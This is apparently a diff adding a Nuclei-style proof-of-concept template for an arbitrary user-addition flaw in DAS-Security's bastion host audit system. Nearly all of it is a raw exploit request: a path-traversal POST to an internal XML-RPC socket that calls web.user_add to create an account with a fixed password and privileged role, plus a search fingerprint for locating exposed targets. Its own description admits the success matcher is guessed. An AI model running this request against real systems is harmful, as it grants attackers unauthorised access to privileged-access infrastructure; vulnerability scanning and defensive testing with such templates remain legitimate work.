@@ -1,0 +1,240 @@
+id: poc-aecedc9f9bd0757187b5
+info:
+  name: 安恒堡垒机任意用户添加漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/aecedc9f9bd0757187b57b60ce98caa1
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: other,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: aecedc9f9bd0757187b57b60ce98caa1
+    fofa: + hunter:`app.name=="安恒明御运维审计与风险控制系统"`
+http:
+- raw:
+  - 'POST /service/?unix:/../../../../var/run/rpc/xmlrpc.sock|http://test/wsrpc HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Length: 1112
+
+
+    <?xml version="1.0"?>
+
+    <methodCall>
+
+    <methodName>web.user_add</methodName>
+
+
+    <params>
+
+    <param>
+
+    <value>
+
+    <array>
+
+    <data>
+
+    <value>
+
+    <string>admin</string>
+
+
+    </value>
+
+
+    <value>
+
+    <string>5</string>
+
+
+    </value>
+
+
+    <value>
+
+    <string>10.17.1.1</string>
+
+
+    </value>
+
+
+    </data>
+
+
+    </array>
+
+
+    </value>
+
+
+    </param>
+
+
+    <param>
+
+    <value>
+
+    <struct>
+
+    <member>
+
+    <name>uname</name>
+
+
+    <value>
+
+    <string>qaxnb666</string>
+
+
+    </value>
+
+
+    </member>
+
+
+    <member>
+
+    <name>name</name>
+
+
+    <value>
+
+    <string>yuwe</string>
+
+
+    </value>
+
+
+    </member>
+
+
+    <member>
+
+    <name>pwd</name>
+
+
+    <value>
+
+    <string>Admin123..</string>
+
+
+    </value>
+
+
+    </member>
+
+
+    <member>
+
+    <name>authmode</name>
+
+
+    <value>
+
+    <string>1</string>
+
+
+    </value>
+
+
+    </member>
+
+
+    <member>
+
+    <name>deptid</name>
+
+
+    <value>
+
+    <string></string>
+
+
+    </value>
+
+
+    </member>
+
+
+    <member>
+
+    <name>email</name>
+
+
+    <value>
+
+    <string></string>
+
+
+    </value>
+
+
+    </member>
+
+
+    <member>
+
+    <name>mobile</name>
+
+
+    <value>
+
+    <string></string>
+
+
+    </value>
+
+
+    </member>
+
+
+    <member>
+
+    <name>comment</name>
+
+
+    <value>
+
+    <string></string>
+
+
+    </value>
+
+
+    </member>
+
+
+    <member>
+
+    <name>roleid</name>
+
+
+    <value>
+
+    <string>101</string>
+
+
+    </value>
+
+
+    </member>
+
+
+    </struct></value>
+
+
+    </param>
+
+
+    </params>
+
+
+    </methodCall>'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
